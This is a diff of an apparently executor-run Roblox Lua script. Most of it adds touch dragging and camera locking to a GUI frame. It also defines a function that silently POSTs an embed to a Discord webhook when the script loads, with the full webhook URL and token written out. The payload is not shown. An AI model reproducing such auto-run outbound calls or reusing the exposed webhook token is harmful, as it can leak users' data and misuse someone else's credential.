@@ -83,39 +83,43 @@ MinimizeButton.MouseButton1Click:Connect(function()
 	tween:Play()
 end)
 
--- Dragging Functionality
-local dragging
+local dragging = false
 local dragInput
 local dragStart
 local startPos
 
 local function onInputBegan(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 then
-		dragging = true
-		dragStart = input.Position
-		startPos = MainFrame.Position
+    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
 
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragging = false
-			end
-		end)
-	end
+        -- Disable camera movement while dragging
+        UserInputService.TouchMovementEnabled = false
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+                -- Re-enable camera movement when done dragging
+                UserInputService.TouchMovementEnabled = true
+            end
+        end)
+    end
 end
 
 local function onInputChanged(input)
-	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-		local delta = input.Position - dragStart
-		MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-	end
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
 end
 
 TopBar.InputBegan:Connect(onInputBegan)
 UserInputService.InputChanged:Connect(onInputChanged)
 
 
+-- Webhook Execution
 local function tpwebhook()
-
     local data1 = {
         ["content"] = "",
         ["embeds"] = {{
@@ -136,15 +140,14 @@ local function tpwebhook()
 
     local response = http_request({
         Url = "https://discord.com/api/webhooks/1339096433986637875/_6x-gYLLy9MEuvuZGx9l17iMaQPEMjdXG0Xgy2_WSpOlmJ_Ut_Y8Q5nzD4HSakhIg4wB",
-
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
         },
-
         Body = HttpService:JSONEncode(data1)
     })
 
     print(response.Success)
 end
+
 pcall(function() tpwebhook() end)
